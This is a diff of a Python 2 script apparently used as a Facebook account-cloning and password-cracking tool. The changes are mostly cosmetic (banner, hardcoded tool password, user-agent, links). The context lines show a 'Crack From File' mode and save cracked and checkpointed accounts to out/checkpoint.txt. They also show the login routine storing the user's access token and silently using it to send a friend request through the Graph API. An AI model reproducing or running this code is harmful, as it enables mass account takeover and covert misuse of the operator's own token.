@@ -1,35 +1,22 @@
-    
-#!/usr/bin/python2
-#coding=utf-8
 
-
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
-from multiprocessing.pool import ThreadPool
-from requests.exceptions import ConnectionError
-from mechanize import Browser
-
-
-reload(sys)
-sys.setdefaultencoding('utf8')
+  2  bxi.py 
+@@ -13,7 +13,7 @@
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
 
 def keluar():
 	print "\033[1;96m[!] \x1b[1;91mExit"
 	os.sys.exit()
-
-
 def acak(b):
     w = 'ahtdzjc'
     d = ''
     for i in x:
         d += '!'+w[random.randint(0,len(w)-1)]+i
     return cetak(d)
-
-
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
@@ -38,33 +25,27 @@ def cetak(b):
     x += '\033[0m'
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
-
-
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(00000.1)
-
-
 ##### LOGO #####
-logo = """
-\        /\       / 
-  \    /    \   /
+logo = """ 
+\        /\     / 
+  \    /    \ /
     \/  /\  \/
-   / \/    \/\
+   / \/    \/ \
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mMr Dj
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous trickers
+\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
+\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
 \033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
+\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
 \033[1;91m======================================="""
-
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)
-
-
 back = 0
 berhasil = []
 cekpoint = []
@@ -73,19 +54,17 @@ id = []
 listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
-
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mMr Dj
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous trickers
+\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
+\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
 \033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
+\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-
-CorrectUsername = "Mr_DJ"
-CorrectPassword = "FOOLVA"
-
+CorrectUsername = "foolva"
+CorrectPassword = "foolvi"
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
@@ -96,11 +75,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            
+            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
     else:
         print "Wrong Username"
-        
-
+        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
 def login():
 	os.system('clear')
 	try:
@@ -140,7 +118,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.youtube.com/channel/UC4x29jHh48BmYF9h6BD3loA')
+				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -156,8 +134,6 @@ def login():
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
-
-
 def menu():
 	os.system('clear')
 	try:
@@ -188,11 +164,9 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m START CLONING WITH DJ"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
-
-
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if unikers =="":
@@ -207,8 +181,6 @@ def pilih():
 	else:
 		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
 		pilih()
-
-
 def super():
 	global toket
 	os.system('clear')
@@ -227,7 +199,6 @@ def super():
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
-
 def pilih_super():
 	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
 	if peak =="":
@@ -284,7 +255,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press  z')
+	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
 	print 42*"\033[1;96m="
 	
 			
@@ -410,6 +381,5 @@ def pilih_super():
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
-
 if __name__ == '__main__':
 	login()
